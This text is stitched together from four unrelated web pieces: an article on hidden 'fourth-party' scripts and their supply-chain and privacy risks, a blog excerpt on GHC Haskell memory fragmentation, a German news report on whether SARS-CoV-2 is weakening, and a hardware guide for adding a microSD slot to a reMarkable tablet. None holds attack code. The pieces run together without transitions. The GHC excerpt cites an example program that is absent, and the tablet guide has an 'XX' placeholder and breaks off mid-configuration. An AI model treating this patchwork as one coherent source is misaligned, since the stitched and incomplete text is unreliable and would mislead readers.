<h4><b>Fourth-parties by Numbers</b></h4>
<p><span>To get a more accurate view, let’s look at the numbers first. On average, e-commerce websites, financial and online services websites today use approximately 30 to 80 third-party vendors in total. According to our data, based on thousands of financial and e-services site analysis, the average ratio is 30% of fourth party apps. When we examine ecommerce sites or news sites, the ratio in many cases becomes higher and so are the definite numbers.&nbsp;</span></p>

<h4><span>Third and fourth-parties expansion on commercial websites 2016-2020 (prediction)&nbsp;</span></h4>

<h4><b>Meet New Friends: </b><b>few examples of fourth parties.<br>
Are you familiar with them?</b></h4>
<p><b>ComScore –&nbsp;</b><span>To show how fourth-parties are used and to demonstrate the risks they present, we’ll refer to how several advertising giants are using ComScore’s media measurement and analytics tools. ComScore is an authority and ad products are almost bound to use it. For these advertising products ComScore is a third-party, an analytics tool for them. For your website, ComScore is a fourth-party. Most likely you’ll be unaware that it even exists.&nbsp;</span></p>
<p><b>DoubleClick –&nbsp;</b><span>Here’s another example. As part of your marketing efforts, you use an embedded YouTube clip to present your product on your website. But did you know that Google installs Double-Click pixels on your website?YouTube belongs to Google, and Google uses its advertising platform, Double-Click, to monitor who is watching your YouTube video. So now you have a Double Click pixel on your website.&nbsp;</span></p>

<p><em>Fourth-party apps detected on a typical scanned news website. </em><br>
<em>Source: Reflectiz scan results. </em></p>
<p><b>Video Players – </b><span>Almost any website today uses a video player. To enable internet video player functionalities, these tools are using a wide variety of technologies, in many cases open-source., Once you use a video player solution on your website, the provider installs a fourth-party which is the player itself. This happens with no prior approval or control from the security team’s end.</span></p>
<p><b>Anti-Bots&nbsp; –&nbsp;</b><span>Anti-Bot tools are commonly used on websites for security reasons and to make sure no one is “spamming” components like video or watch count, and the data gathering in the process. But to function properly, Anti-Bots needs to do key-logging on your users’ actions.</span></p>
<p><i><span>The bottom line is simple. From almost any third-party component you use, you suddenly got yourself several unattended “friends”, fourth-parties, that are now running on your site.&nbsp;</span></i><i><span>Well, this may be legitimate, but&nbsp; are you willing&nbsp; to let external components decide what will run on your website?. &nbsp; </span></i></p>

<h4><b>Fourth-parties on websites from cyber-security perspective</b></h4>
<p><span>If we go back to where we just started, all these “friends”are running on the user’s browser. Therefore, they are identical to the user, with no way to distinguish between them, i.e., client-side code. In practice a third-party vendor can load other’s vendor scripts to a page, without your users even noticing it. From a cyber-security point of view that is a severe risk.&nbsp;</span></p>
<h6><b>Fourth parties risks&nbsp;</b></h6>
<p><span>Almost by default fourth-parties introduce an uncareful supply-chain process presenting both privacy and security risks. And that can be a problem, especially if you consider its GDPR / CCPA implications, or possible supply-chain attacks. From an end-user point of view, the fourth and third parties are both data processors.&nbsp; Both have the same authorization level and ability to provide the same privacy rights stated by the regulation. You, as the website security owner, need to validate it.</span></p>
<p><span>Those are relatively simple cases, but according to what we see in our day-to-day analysis, most cases are more complex and involve a structured process of commercial data sharing. Like other supply chain processes, without proper monitoring tools, this instance would be almost impossible to track. The privacy and security consequences are clear cut. Be aware!</span></p>
<h6><b>Supply-chain Attacks</b></h6>
<p><span>If you consider supply chain attacks, the role of fourth-parties becomes clearer and so does the need to address it as an evolving risk factor – especially for the web ecosystem.&nbsp;</span></p>
<p><span>Hacking fourth-party vendor scripts on YOUR website almost equals hacking your website. The biggest challenges for security teams in this case are visibility. Unfortunately, in most cases there’s no way for security teams to monitor these new “friends” that just settled on your website, likely without your permission.</span></p>
<p><span>Fourth-parties are hard to discover. From an attacker point-of-view, it’s a strategy sometimes a goldmine. Similar to third-parties, an attacker can hack more websites through a single hub, but the same attacker can also hide the trails more effectively and avoid tracking.</span></p>

<h4><b>How to handle your web fourth-parties and control them?</b></h4>
<p><span>Everyone today focuses on privacy regulations, security and privacy professionals deal with the uncompromising requirement to identify data processors. In thi case, fourth-parties become a severe and immediate risk.&nbsp;</span></p>
<h6><b>Demands from financial institutions&nbsp;</b></h6>
<p><span>According to EBA published in 2019 every major financial institution in the European Union should reveal its critical fourth-party vendors. For the first time, banks are demanded to do due diligence and monitor their fourth parties. However, do they have the ability to detect them? How can financial institutions actually monitor them?</span></p>
<h6><b>Are the security perimeters you currently use enough?&nbsp;</b></h6>
<p><span>The common third-party security practice involves due-diligence processes, questioners, seasonal vendor surveys, penetration-testing and even intelligence tools. But when it comes to fourth-parties on websites, this is hardly the case. Are these your vendors? Can you trust them? Here’s the problem with fourth-parties: these are not your vendors, these are your vendors’ vendors!&nbsp;</span></p>
<p><span>Within the regular cyber-security course, these are hard to track. Fortunately, when we refer to websites there are few great tools (and Reflectiz is one of them) that allow security teams identify the presence of fourth-parties and, what’s beyond them.</span></p>
<p><span>Once discovered, an effective cyber-security process needs to be carried out in order to avoid unnecessary fourth-parties privacy and security risks. This should include adding fourth-parties to the relevant third-party due-diligence process, fourth-party tracking, technology funnel identification, and a notification mechanism that alerts of any related abnormality according to its severity. But the most important missions you need to start with are to first discover your fourth-parties. and second- create a baseline and detect any modification.&nbsp; </span></p>

        <div>
          <p>Recently I’ve done a bit of work for <a href="https://hasura.io/">Hasura</a>, investigating some strange memory behavior in <a href="https://github.com/hasura/graphql-engine">graphql-engine</a>. When measuring memory usage, we can ask the operating system (OS) how much memory our process is using, but we can also use the GHC runtime system’s (RTS) heap profiler. After running a <code>graphql-engine</code> benchmark, the server’s memory usage reported by the OS was much higher than the “heap residency” reported by GHC’s heap profiler. This led us down a bit of a rabbit hole of understanding memory allocation and memory fragmentation in programs compiled with GHC.</p>
<p>In this blog post, we look at memory fragmentation in the Haskell heap and how it arises. We look at how fragmentation affects the discrepancy between heap residency reported by the RTS and memory usage reported by the OS. In particular, we focus on a pathological case of a program that makes use of pinned data and transitions from high heap residency to relatively low heap residency.</p>
<!-- more -->
<h3 id="memory-metrics">Memory Metrics</h3>
<p>On Linux there are multiple ways to measure memory usage of a process, but the one we’ll focus on is <em>virtual memory resident set size</em>, <code>VmRSS</code>. This can be sampled from <code>/proc/&lt;PID&gt;/status</code> where <code>&lt;PID&gt;</code> is a process ID. We won’t get into the details of this, but suffice it to say that we consider <code>VmRSS</code> the “true” memory usage of our Haskell program.</p>
<p><em>Heap residency</em> is a measurement taken by the runtime system’s heap profiler. It measures the size of all <em>live</em> data on the Haskell heap. <code>VmRSS</code> is always higher than heap residency. The reason is that heap residency is only a measure of <em>live</em> data on the Haskell heap while <code>VmRSS</code> is “all inclusive”. <a href="https://downloads.haskell.org/~ghc/8.10.2/docs/html/users_guide/profiling.html#actual-memory-residency">The GHC user’s guide</a> gives the following reasons for a higher <code>VmRSS</code>:</p>
<ol type="1">
<li>Overhead due to a profiled build. Each heap object uses an extra 2 words that are usually not counted in the heap profile.</li>
<li>Garbage collection. The copying collector (i.e.&nbsp;the default collector) makes a copy of all live unpinned data causing a peak in memory usage.</li>
<li>Thread stacks are not counted in the heap profile by default. Profiling with the <code>-xt</code> runtime system option includes stacks in the profile.</li>
<li>The program text itself, the C stack, any “non-heap” data (e.g.&nbsp;data allocated by foreign libraries and data allocated by the RTS itself), and <code>mmap()</code>‘d memory are not counted in the heap profile.</li>
</ol>
<p>In the following section is an example program which we focus on for this blog post. We’ll dive into the details shortly, but this program exhibits much higher <code>VmRss</code> than heap residency, so let’s consider why this might be:</p>
<ul>
<li><p>We’re not using a profiled build, so point 1 does not apply.</p></li>
<li><p>In general, stack usage can be significant and you should profile with <code>-xt</code> to diagnose this. The example program has negligible stack size, so point 3 also doesn’t apply.</p></li>
<li><p>The runtime system (RTS) is written in C and has it’s own stack and non-heap data, but this is negligible compared to the large amount of data we’re allocating on the Haskell heap. The program text is small and we’re also not calling any foreign code nor <code>mmap()</code>’ing any memory, so point 4 doesn’t apply.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></p></li>
</ul>
<p>That leaves point 2 which is certainly applicable, but there is another reason that the above list does not mention: fragmentation.</p>
<p>Another metric from the RTS is the <em>heap size</em>. Heap size is an all inclusive metric of the Haskell heap. It includes fragmentation. <code>VmRSS</code> and heap size are about equal in our example program.<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a> Comparing <code>VmRSS</code> and heap size is a good way to check if the memory usage is truly in the Haskell heap or if there are other issues as listed in point 4.</p>
<h4 id="kilobyte-vs-kibibyte">Kilobyte vs Kibibyte</h4>
<p>As we’re closely counting bytes, we should make clear the awkward situation that memory is sometimes reported in base 10 units (e.g.&nbsp;kilobyte (kB) = 1000 bytes) and sometimes in base 2 units (e.g.&nbsp;kibibyte (KiB) = 1024 bytes). To make it worse, the “i” used in the symbols for base 2 units (e.g.&nbsp;“KiB”) is often omitted so they look just like the base 10 counterpart (e.g.&nbsp;“KB”). Confusingly, <code>/proc/&lt;PID&gt;/status</code> says “kB” but means “KiB”. The <code>eventlog2html</code> output says “G”, “M”, and “K” but means “GB”, “MB”, “kB”. The debugging output from the <code>-Dg</code> RTS option prints “MB” but means “MiB.”<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
<p>With the exception of the heap profile graphs (generated with <code>eventlog2html</code>), all numbers in the blog post will be in base 2: gibibyte (GiB) = 1024 MiB, mebibyte (MiB) = 1024 KiB, and kibibyte (KiB) = 1024 bytes.</p>

<p>Compile with <code>ghc -rtsopts -eventlog -debug Main.hs</code> and run with <code>./Main 10000000 +RTS -s -Dg -hT -l --disable-delayed-os-memory-return -RTS</code>. The <code>-hT -l</code> options produce an eventlog with a memory profile that we can be visualized with <code>eventlog2html</code>. The <code>-Dg</code> option prints garbage collector statistics to standard error. The <code>--disable-delayed-os-memory-return</code> option is explained later.</p>
<p>Consider what we expect when running a heap profile. The program should allocate some memory then spin a bit. Next, <code>superset</code> is garbage collected and we’re left with <code>subset</code>. We expect heap residency to drop to 1/10 of the size. After spinning for some more time the program will exit. That’s what we expect. Here is what the heap profile shows:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/prof-heap-strip.svg"></p>
<p>The majority of memory is <code>PS</code>, <code>ARR_WORDS</code>, <code>:</code>, and <code>PlainPtr</code>. These are the type constructors found in a list of <code>ByteString</code>. <code>PS</code> is the <code>ByteString</code> constructor and <code>PlainPtr</code> and <code>ARR_WORDS</code> are internal to <code>ByteString</code>. We see that allocating <code>superset</code> results in about 1.04GiB (1.12GB) of heap residency corresponding to the first plateau in the heap profile between 27 and 39 seconds. After this, we take 1/10 of that data, <code>subset</code>, and allow the rest of <code>superset</code> to be garbage collected. Hence, we expect the heap residency to drop to about 1/10 of the size, 0.10GiB (0.11GB), but this is not what the profile shows! Heap residency decreases only to about 0.37GiB (0.4GB) and all of <code>ARR_WORDS</code> is unexpectedly retained.</p>
<p>This is not some subtle mistake in the code causing <code>ARR_WORDS</code> to be retained. This is in fact due to how the RTS handles pinned memory. Let’s look at the memory residency reported by the operating system. I sampled the <code>VmRSS</code> reported in <code>/proc/&lt;pid&gt;/status</code> every 0.01 seconds:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/prof-vmrss-strip.svg"></p>
<p>The <code>VmRSS</code> has some discrepancies with the heap profile. The OS is reporting about 1.84GiB of memory at the first plateau. That’s almost 1.8 times more than the heap profile. In synch with the heap profile, between 40 and 61 seconds, there is a second plateau where <code>VmRSS</code> is about 1.5GiB. That’s about 4 times more than the heap profile. So not only is the <code>VmRSS</code> significantly higher than heap residency on the first plateau, but the discrepancy is much worse on the second plateau.</p>
<h3 id="the-heap">The Heap</h3>
<p>In order to make sense of the memory profile we need to understand the structure of GHC’s Haskell heap, how allocation works, and a bit about garbage collection. I’ll give a simplified overview of this. In particular I’m ignoring megablock/block groups, block descriptors, and am only considering the oldest garbage collector generation. I’m also assuming that the default copying garbage collector is in use.</p>
<h4 id="megablocks-blocks-and-objects">Megablocks, Blocks, and Objects</h4>
<p>The Haskell heap is made up of 1MiB “megablocks”. Within those are 4KiB “blocks”. Within those blocks are the actual data objects. Blocks are designated as exclusively containing either pinned or unpinned data. Here is an example of what the heap might look like in virtual memory space:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/heap-legend.png"> <img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/heap-example.png"></p>
<p>This is not to scale. In reality a megablock contains many more blocks, a block typically contains many more objects, and objects can vary in size. Notice that megablocks are not necessarily contiguous within virtual memory space. We call the unused gaps between megablocks “megablock level fragmentation”:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/megablock-level-frag.png"></p>
<p>Likewise the unused gaps between blocks within megablocks is called “block level fragmentation”:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/block-level-frag.png"></p>
<p>Dead objects within blocks are called “object level fragmentation”:</p>
<p><img src="https://www.well-typed.com/blog/aux/images/memory-fragmentation/object-level-frag.png"></p>
<p>Note that some blocks have some unused space at the end because we have yet to add objects there or there was not enough space to add an object so the RTS allocated a new block instead. That extra space is called “slop” and we don’t count this as object level fragmentation. We mostly ignore slop for this post.</p>
<h4 id="pinned-data">Pinned Data</h4>
<p>What is pinned data? Thanks to referential transparency, the memory address of an object in Haskell is usually not important. This permits the RTS’s default copying garbage collector to move objects around in memory i.e.&nbsp;changing their memory location. In practice, we may want a chunk of memory that won’t be moved by the RTS. The most obvious example is when passing data to foreign code. The foreign code won’t be very happy if the RTS suddenly moves that data. As such, GHC supports the notion of “pinned” data which can be allocated via <code>GHC.Exts.newPinnedByteArray#</code> and similar variants. Pinned data is guaranteed not to be moved by the RTS. We refer to all other data as “unpinned”. …</p></div></div></div>

              <p><strong>Experten sehen bereits Hinweise dafür, dass Sars-CoV-2 an Gefährlichkeit einbüßt. Dies könnte zugleich jedoch auf eine bessere Anpassung zurückgehen - und dem Erreger sogar nützen. Möglicherweise besteht ein Zusammenhang zu einer neuen Variante, die sich derzeit weltweit durchsetzt.</strong></p>
              <p>Wird das Coronavirus Sars-CoV-2 sich mit der Zeit abschwächen und am Ende nur noch als Erkältung oder Schnupfen auftreten? Diese Hoffnung wird zuletzt vom Virologen <a href="https://www.n-tv.de/wissen/Covid-19-bald-nur-noch-Erkaeltung--article21981433.html" target="_blank" rel="Follow">Ulf Dittmer am Uniklinikum Essen befeuert</a>. "Es gibt tatsächlich Hinweise darauf, dass sich das Virus bereits abschwächt. Und es könnte auch sein, dass das Virus im Zuge der Veränderungen irgendwann nur noch eine Erkältung oder einen Schnupfen auslöst", sagte Dittmer der "Bild"-Zeitung.</p> <p>Der Virologe stützt seine Einschätzung vor allem auf zwei Beobachtungen: Zum einen gebe es in Ländern mit einer zweiten Pandemie-Welle weniger Todesfälle. Zum anderen werde bei Corona-Patienten immer häufiger eine Störung der Geschmacks- und Geruchsfähigkeit beobachtet, welche bei den Symptomen mittlerweile an erster Stelle stünden. "Aber gerade diese Symptomatik ist mit einem schwächeren Krankheitsverlauf verbunden", so Dittmer.</p><p>Tatsächlich fällt die Fallsterblichkeit weltweit, etwa in den USA, aber auch <a href="https://www.n-tv.de/wissen/Ist-das-Coronavirus-harmloser-geworden-article21980186.html" target="_blank" rel="Follow">in Deutschland</a>. Allerdings könnte dies auch am sinkenden Durchschnittsalter der Infizierten liegen, wie Dittmer selbst einräumt. Aber auch eine größere Vorsicht der Bevölkerung, das Abstandhalten und Tragen von Masken oder verbesserte Behandlungsmethoden nennen Experten als weitere mögliche Gründe.</p><h2>Coronaviren schützen sich vor Mutationen</h2><div> <div> <figure> <a href="https://www.n-tv.de/mediathek/videos/panorama/Von-hier-kommen-die-meisten-infizierten-Rueckkehrer-article21979830.html" title="Von hier kommen die meisten infizierten Rückkehrer"> <picture> <source data-srcset="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/750/Risikogebiete.jpg, https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg 2x" media="(max-width: 767px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/750/Risikogebiete.jpg, https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg 2x" media="(min-width: 768px) and (max-width: 1279px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg, https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1564/Risikogebiete.jpg 2x" media="(min-width: 1280px)"> <img alt="Risikogebiete.JPG" data-src="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg" src="https://apps-cloud.n-tv.de/img/21979867-1597751723000/16-9/1136/Risikogebiete.jpg"> </picture></a> </figure>  </div> </div><p> Allerdings haben Forscher bereits nachweisen können, dass das Coronavirus Sars-Cov-2 mutiert, was auch veränderte Eigenschaften zur Folge haben könnte. Doch geht die Mutation im Unterschied zu anderen RNA-Viren wie Influenza relativ träge vonstatten, da Coronaviren über einen eingebauten Kopierschutz verfügen. Denn Mutationen sind nicht zwangsläufig von Vorteil für ein Virus, sondern können es auch hemmen. Beim Replikationsprozess von Sars-CoV-2 wird das Genom daher noch mal überprüft, und unerwünschte Mutationen, die das Virus <a href="https://www.nature.com/articles/nrmicro3125" target="_blank" rel="Follow">schwächen und seine Ansteckungskraft dämpfen könnten,</a> werden dadurch vermieden.</p><p>Dennoch ist auch Sars-CoV-2 nicht vor Veränderungen durch Mutationen gefeit. Könnte der Erreger dadurch mit der Zeit also tatsächlich an Gefährlichkeit abnehmen? Eine derartige Entwicklung sei nicht ungewöhnlich, sagt Arzt und Medizinjournalist Dr. Christoph Specht ntv.de. Bei Erregern, die aus dem Tierreich auf den Menschen übertreten, gelten zwei Entwicklungen als typisch: Zum einen passen sie sich durch Mutationen mit der Zeit an ihren neuen Wirt an und können ansteckender werden. Zum anderen machen sie den Wirt, also den Menschen, dann aber oft weniger krank. Die Tödlichkeit sinkt also.</p><p>Immer ansteckender zu werden, ist ein evolutionärer Vorteil für Viren - denn dadurch können sie sich besser verbreiten. Charité-Virologe Christian Drosten hatte in einem <a href="https://www.ndr.de/nachrichten/info/47-Coronavirus-Update-Mutationen-koennen-auch-Hoffnung-bieten,podcastcoronavirus222.html" target="_blank" rel="Follow">NDR-Podcast</a> Anfang Juni erklärt, wie zufällige Mutationen dazu führen können, dass sich das Coronavirus etwa noch besser in der Nase vermehrt und dadurch die Chance, auf andere Wirte überspringen zu können, erhöht. "Aber in der Nase werden wir nicht allzu krank davon", so Drosten. "Das heißt, das Ganze wird auf lange Sicht zu einem Schnupfen, der sich für die Lunge gar nicht mehr interessiert. So etwas könnte passieren."</p><h2>Neue Mutation könnte der Schlüssel sein</h2><div> <div> <figure> <a href="https://www.n-tv.de/mediathek/videos/panorama/Ignorante-Einzelne-bringen-alle-in-Corona-Gefahr-article21979841.html" title="Ignorante Einzelne bringen alle in Corona-Gefahr"> <picture> <source data-srcset="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/750/imago0102595718h.jpg, https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg 2x" media="(max-width: 767px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/750/imago0102595718h.jpg, https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg 2x" media="(min-width: 768px) and (max-width: 1279px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg, https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1564/imago0102595718h.jpg 2x" media="(min-width: 1280px)"> <img alt="imago0102595718h.jpg" data-src="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg" src="https://apps-cloud.n-tv.de/img/21979930-1597753158000/16-9/1136/imago0102595718h.jpg"> </picture></a> </figure>  </div> </div><p> Die Nase scheint für das Coronavirus tatsächlich eine wichtige Andockstelle zu sein: Was auch das häufig beobachtete Symptom der gestörten Geschmacks- und Geruchsfähigkeit erklären könnte, auf die der Essener Virologe Dittmer verweist. Denn laut einer aktuellen <a href="https://erj.ersjournals.com/content/early/2020/07/23/13993003.01948-2020" target="_blank" rel="Follow">Studie</a> konnten Forscher an der Riechschleimhaut der Nase besonders viele jener Rezeptoren nachweisen, an die das Coronavirus andockt, um sich zu vermehren. Dort befinden sich jedoch auch die Sinneszellen für das Riechen - werden diese durch das Virus angegriffen und beschädigt, können sie nicht mehr richtig arbeiten.</p><p>Gleichzeitig gibt es bereits Hinweise auf eine möglicherweise entscheidende Mutation bei Sars-CoV-2. Eine <a href="https://www.cell.com/cell/fulltext/S0092-8674(20)30820-5?_returnURL=https%3A%2F%2Flinkinghub.elsevier.com%2Fretrieve%2Fpii%2FS0092867420308205%3Fshowall%3Dtrue" target="_blank" rel="Follow">Studie </a>von Forschern um die US-Biologin Bette Korber von Anfang Juli konnte nachweisen, dass sich eine mutierte Variante des ursprünglichen Virus bereits weltweit durchgesetzt hat. Diese G-Variante zeigt eine Mutation am Spike-Protein, mit dem das Virus an Zellen andockt. Wie die Forscher herausfanden, kann diese aufgrund der Mutation besser an menschliche Zellen andocken als ihr Vorläufer, die D-Variante - und ist nach Auskunft anderer Forscher um ein Vielfaches infektiöser. Zudem tragen mit der G-Variante infizierte Menschen eine höhere Virenlast in sich.</p><p>Die ansteckendere G-Variante war im März noch relativ selten, trat dann aber unter anderem von Europa aus ihren Siegeszug über die Welt an. Im Juli trugen bereits rund 80 Prozent der Patienten weltweit die neue G-Variante in sich. Paul Tambyah, designierter Präsident der <a href="https://isid.org/" target="_blank" rel="Follow">Internationalen Gesellschaft für Infektionskrankheiten (ISID)</a>, hatte die Vermutung geäußert, dass die zunehmende Verbreitung der G-Variante weltweit mit der sinkenden Todesrate zusammenhängt. Dies ist jedoch umstritten. Zumindest aber scheint die neue Variante nicht gefährlicher zu sein als ihr Vorgänger: "Wir fanden (...) keinen signifikanten Zusammenhang zwischen dem Mutations-Status und der Schwere der Erkrankung und des Verlaufs", heißt es in der Studie des Korber-Teams.</p><h2>"Vielleicht in ein paar Jahren" weniger gefährlich</h2><div> <div> <figure> <a href="https://www.n-tv.de/mediathek/videos/panorama/Dr-Zinn-Zwei-Gruppen-machen-uns-Probleme-article21977836.html" title="Dr. Zinn: &quot;Zwei Gruppen machen uns Probleme&quot;"> <picture> <source data-srcset="https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/750/DrZinnFeiern.jpg, https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/1136/DrZinnFeiern.jpg 2x" media="(max-width: 767px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/750/DrZinnFeiern.jpg, https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/1136/DrZinnFeiern.jpg 2x" media="(min-width: 768px) and (max-width: 1279px)"> <source data-srcset="https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/1136/DrZinnFeiern.jpg, https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/1564/DrZinnFeiern.jpg 2x" media="(min-width: 1280px)"> <img alt="DrZinnFeiern.JPG" data-src="https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/1136/DrZinnFeiern.jpg" src="https://apps-cloud.n-tv.de/img/21978069-1597682308000/16-9/1136/DrZinnFeiern.jpg"> </picture></a> </figure>  </div> </div><p> Doch könnte sich die Mutation möglicherweise negativ auf die Suche nach einem Impfstoff auswirken? Sebastian Maurer-Stroh von der Agentur für Wissenschaft, Technologie und Forschung sagte der Nachrichtenagentur Reuters, dass die beobachteten Mutationen nicht ausreichten, um potenzielle Impfstoffe weniger wirkungsvoll zu machen. Die Virus-Varianten seien immer noch "fast identisch, und haben nicht jene Bereiche verändert, welche unser Immunsystem üblicherweise erkennt", so Maurer-Stroh. Für die Impfstoffentwicklung sollte dies also keinen Unterschied machen.</p><p>Dr. Specht hält es für wahrscheinlich, dass sich das Coronavirus Sars-CoV-2 zu einer Erkältung entwickeln wird, die weit weniger gefährlich verläuft. "Das könnte vielleicht in ein paar Jahren der Fall sein." Möglicherweise habe es in der Vergangenheit bei den vier bereits im Menschen vorkommenden Coronaviren, die ebenfalls meist nur harmlose Erkältungen verursachen, einen ähnlichen Verlauf gegeben. "Sie sind ziemlich sicher alle zuvor aus dem Tierreich auf den Menschen übergesprungen", so Specht. Nach einer anfänglich gefährlicheren Phase mit vielen Todesfällen könnten sie sich über lange Zeit massiv abgeschwächt haben. Möglicherweise liege der erste Kontakt mit Menschen schon Jahrhunderte zurück.</p></div></div>]]>

August 21, 2020 | http://www.davisr.me/projects/remarkable-microsd/ | <a href="https://web.archive.org/web/*/http://www.davisr.me/projects/remarkable-microsd/">archive.org</a>

      <p>This page discusses how I added a microSD card to my <a href="https://arstechnica.com/gadgets/2017/12/remarkable-tablet-review-the-high-price-of-getting-that-paper-feeling/">reMarkable tablet</a>. I did this because I want to develop software for my rM without wearing out the internal eMMC. I chose an external card because I want to be able to swap them easily; it also makes backups faster.<br>
</p>

<h2><a name="opening">Opening the Case</a></h2>
<p>
The aluminum back panel is held to the plastic case with glue. I have 
not yet determined what melts this glue, or how to “properly” take the 
back off. I was able to lift it off, by starting slowly in a corner. 
Thereafter, I used a putty knife to slowly peel it away. The panel bent,
 but I was able to bend it mostly-flat again.
</p><p>
Next, there is a magnesium chassis screwed to the plastic case. 
Underneath the rubber feet are six silver screws. There are also XX 
black screws, that must be removed.
</p><p>
The epaper display is glued to the magnesium chassis; don’t try to pull 
it apart. There is also a white silicone-like substance around the edge 
of the epaper panel, which seems to disintegrate and flake off. I think 
it fills the gap, and perhaps offers a little waterproofing. This is 
non-replaceable. The screen can be pushed apart from the plastic 
chassis. It is held on the perimeter with plastic latches, so split it 
with a spudger and go slowly.
</p><p>
With the case off, the guts can be removed. There are five connectors to
 the logic board. In clockwise order starting at top-left: power button,
 touch panel, antenna, epaper display, USB daughterboard and buttons, 
and Wacom digitizer.
</p><p>
Finally, the logic board can be removed. It is held with six small 
screws and washers. Underneath the logic board is a plastic tape, a 
section of which must be removed around the SD pads.
</p>

<h2>
<a name="positioning">Positioning the Card</a>
</h2>
<p>
The bottom-right seemed like an appropriate placement for the card 
socket, because the area is already spacious. The right side was easier 
to route the cables to, because of the channels cut in the white plastic
 case. I reassembled the reMarkable 
prior to soldering, to ensure no bulges or deformities appered.
</p>

<h2>
<a name="soldering">Soldering the Wires</a>
</h2>
<p>
Using ten 30 AWG wires and plenty of flux, I connected the board to the 
socket. The board indicates which pin is first. The board has a ninth 
pin, which is used for card-detect. This gets pulled low when a card is 
inserted.
</p>

<img src="http://www.davisr.me/projects/remarkable-microsd/flatcable.JPG" alt="Wires underneath logic board">
<p>
To keep things as flat as possible, I used cellophane tape to mate the 
wires to the board. They feed out beneath the digitizer’s FFC cable in 
one beautiful ribbon. This also prevents elecrical contact to the grounded chassis.<br>
</p>

<img src="http://www.davisr.me/projects/remarkable-microsd/wires.JPG" alt="Wires on back">

<h2>
<a name="cutting">Cutting the Case</a>
</h2>
<p>
I drilled the SD slot by-hand with a rotary tool. Starting with a carving bit
 on the inside, I first hollowed out the area to give me a thin veneer, 
measured with a flashlight. Once I felt it was thin enough, I drilled 
from the front with a pointy sanding bit, and cut longitudinally.</p><p>
The magnesium chassis had a small section removed, which was easy with a
 tiny wire cutter. While it sacrifices a little
 bit of strength, it makes up for it in storage capacity.
</p><p>
After testing the fit once again, I fillited epoxy around the edge 
of the socket, gluing it down. I was careful not to get any inside the 
socket.
</p>

<h2>
<a name="loading">Loading the Kernel</a>
</h2>
<p>The stock rM kernel doesn't enable the SDHC1 slot, which is how these
 pins are designated in the device tree file. I recommend first being 
comforable with <a href="https://github.com/torwag/remarkableflash">this remarkable-flash guide</a>, the <a href="http://www.davisr.me/projects/remarkable-microsd/i.MX_BSP_Porting_Guide_Linux.pdf">NXP porting guide for the i.MX6 processor</a>, and the <a href="http://www.davisr.me/projects/remarkable-microsd/i.MX_Yocto_Project_User%27s_Guide_Linux.pdf">i.MX Yocto user guide</a>.<br>

</p>
  <p>The rM is a mostly-vanilla i.MX6 board (many share similaries, including the <a href="http://www.davisr.me/projects/remarkable-microsd/pico-imx6ul-emmc-hobbit-reva1-hardware-manual-20160328.pdf">Hobbitboard</a>).
 As such, it shares the same SDHC interface. What the microSD slot 
connects to, and what the stock kernel does not activate, is the SDHC1 
interface. This can be enabled in the device tree, and the kernel may be
 recompiled to include support for an SD card.<br>
  </p>
<p>
By default, the sdhc1 interface is disabled in the device tree. Enabling
 this is the first step. Copy the 
<code>arch/arm/boot/dts/zero-gravitas-factory.dts</code> over 
<code>arch/arm/boot/dts/zero-gravitas.dts</code>. Then, edit it to enable the sdhc1 
interface like shown in the diff below.
</p>
<pre> &amp;usdhc1 {<br>        pinctrl-names = "default", "state_100mhz", "state_200mhz";<br>        pinctrl-0 = &lt;&amp;pinctrl_usdhc1&gt;;<br>        pinctrl-1 = &lt;&amp;pinctrl_usdhc1_100mhz&gt;;<br>        pinctrl-2 = &lt;&amp;pinctrl_usdhc1_200mhz&gt;;<br>        bus-width = &lt;4&gt;;<br>        cd-gpios = &lt;&amp;gpio4 7 GPIO_ACTIVE_LOW&gt;;<br>        disable-wp;<br>        wp-controller;<br>        keep-power-in-suspend;<br>        enable-sdio-wakeup;<br>        no-1-8-v;<br>        /*disable-wp;*/<br>-       status = "disabled";<br>+       status = "okay";<br> };
</pre>


<p>Next, <code>make zero-gravitas_defconfig</code> and edit the <code>.config</code> file produced to include the following drivers.</p><pre>CONFIG_CFG80211=y
CONFIG_MAC80211=y
CONFIG_BRCMUTIL=y
CONFIG_BRCMFMAC=y
CONFIG_RTL_CARDS=y
CONFIG_BATTERY_BQ27XXX=y
CONFIG_BATTERY_BQ27XXX_I2C=y
CONFIG_USB_ACM=y
CONFIG_USB_F_ACM=y
CONFIG_USB_U_SERIAL=y
CONFIG_USB_CDC_COMPOSITE=y
